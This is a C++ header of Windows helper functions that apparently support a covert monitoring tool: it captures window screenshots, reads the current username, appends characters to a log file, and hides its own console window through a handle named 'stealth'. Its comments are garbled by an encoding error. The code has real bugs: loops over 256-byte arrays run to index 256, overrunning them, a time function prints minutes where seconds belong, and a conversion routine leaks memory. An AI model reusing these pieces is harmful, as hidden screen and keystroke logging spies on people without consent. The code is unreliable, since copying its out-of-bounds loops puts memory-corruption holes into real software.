#pragma once
#include <iostream>
#include <stdlib.h>
#include <Windows.h>
#include <WinUser.h>
#include <atlimage.h> //��Ļ��ͼʹ��
#include <tlhelp32.h>
#include <string>
#include <fstream>
using namespace std;

#pragma comment(lib,"Kernel32.lib") 


#define SPLITCHAR  " ## "

//��ȡ��ǰ��������·��
string GetCurrentWorkDir(void)
{
	char szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL,
		szFilePath,
		MAX_PATH);
	(strrchr(szFilePath, '\\'))[0] = 0;
	string path = szFilePath;
	return path;
}

//��ȡ�û���ʱĿ¼
string GetUserTmpPath()
{
	char tmpPathBuf[MAX_PATH + 1];
	int length = GetTempPath(MAX_PATH, tmpPathBuf);
	if (length != 0)
	{
		cout << "tmpPath: " << tmpPathBuf << endl;
	}
	string tmpPath = tmpPathBuf;
	return tmpPath;
}


//��ȡ��ǰ����
CString GetDate(void)
{
	SYSTEMTIME sys;//ʱ�����
	GetLocalTime(&sys);
	CString year1, month1, day1;
	year1.Format("%04d", sys.wYear);
	month1.Format("%02d", sys.wMonth);
	day1.Format("%02d", sys.wDay);
	CString today = year1 + "-" + month1 + "-" + day1;
	return today;
}

//��ȡ��ǰ��û�����
string GetCurrentUser(void)
{
	char userName[256] = { 0 };
	DWORD nameLen = 256;
	if (!GetUserName(userName, &nameLen))
	{
		printf("GetUserName Error %d\n", GetLastError());
		return "";
	}
	string finalUserName = string(userName);
	return finalUserName;
}

// ��ӡ��Ļ��ͼ
void PrtScn(char   *file_string, HWND hwnd) {

	//��ȡ�ô��ڵĴ�С
	RECT rect;
	GetClientRect(hwnd, &rect);
	int width = rect.right;
	int heigth = rect.bottom;
	// ��ȡ���ڵ��豸�����ģ�Device Contexts��
	HDC hdcWindow = GetDC(hwnd); // Ҫ��ͼ�Ĵ��ھ����Ϊ����ȫ��


								 // ��ȡ�豸�����Ϣ�ĳߴ��С
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	// ����ͼ�����ÿ�ߣ�����
	image.Create(width, heigth, nBitPerPixel);
	// ��ָ����Դ�豸���������е����ؽ���λ�飨bit_block��ת��
	BitBlt(
		image.GetDC(),  // ���浽��Ŀ�� ͼƬ���� ������
		0, 0,     // ��ʼ x, y ����
		width, heigth,  // ��ͼ���
		hdcWindow,      // ��ȡ����� �����ľ��
		0, 0,           // ָ��Դ�����������Ͻǵ� X, y �߼�����
		SRCCOPY);


	image.Save(file_string);

	// �ͷ� DC���
	ReleaseDC(hwnd, hdcWindow);
	// �ͷ�ͼƬ������
	image.ReleaseDC();
	// ��ͼƬ���浽 file_string
	//image.ReleaseGDIPlus();
	image.Destroy();
}

// д���ļ�����
void Write(string testFileName, string ch)
{
	ofstream f1;
	f1.open(testFileName, ios::app);
	f1 << ch;
	f1.close();
	Sleep(5); // ��ʱ5ms
}

// ���ش���
void Hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
}

// ��ֵ�ַ���
void GiveChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
		a[i] = b[i];
}

// ����ַ��� ��ͬ����0 ��ͬ����1
bool CheckChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
	{
		if (a[i] != b[i])
		{
			return 0;
		}
	}
	return 1;
}

// ��ȡϵͳʱ��
void GetSystemTime()
{
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	cout << sys.wYear << "/" << sys.wMonth << "/" << sys.wDay << " " << sys.wHour << ":" << sys.wMinute << ": " << sys.wMinute << " ";
}


// charתwide char
wchar_t* c2w(const char *str)
{
	int length = strlen(str) + 1;
	wchar_t *t = (wchar_t*)malloc(sizeof(wchar_t)*length);
	memset(t, 0, length * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str), t, length);
	return t;
}


